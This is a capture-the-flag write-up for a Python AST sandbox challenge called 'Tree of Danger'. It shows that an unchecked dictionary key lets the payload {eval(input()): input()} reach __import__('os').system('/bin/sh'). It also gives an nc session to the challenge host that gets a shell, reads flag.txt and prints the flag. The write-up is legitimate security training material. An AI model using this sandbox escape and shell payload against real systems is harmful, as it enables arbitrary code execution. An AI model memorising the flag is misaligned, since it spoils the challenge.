# (misc) Tree of Danger

### Proof of Concept

The provided code uses the Python 'ast' module to deny the use of certain features. 

The `is_dict` function, however, doesn't check that the key is valid:
```python
def is_dict_safe(node: ast.Dict) -> bool:
    for k, v in zip(node.keys, node.values):
        if not is_expression_safe(k) and is_expression_safe(v):
            return False
    return True
```

Thus, we can place our payload into the key of a dictionary literal.

### Vulnerability Explanation

We need to create a payload that will provide the flag when run. 
A simple one is `eval(input())`, which will allow us to provide a second payload (such as `__import__('os').system('/bin/sh')`) without any restrictions.

### Solvers/Scripts Used

We can exploit the service by hand using the techniques mentioned above:
```
nc 167.172.51.245 31979
Welcome to SafetyCalc (tm)!
Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc
> {eval(input()): input()}
__import__('os').system('/bin/sh')

ls
app
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat flag.txt
HTB{45ts_4r3_pr3tty_c00l!}
```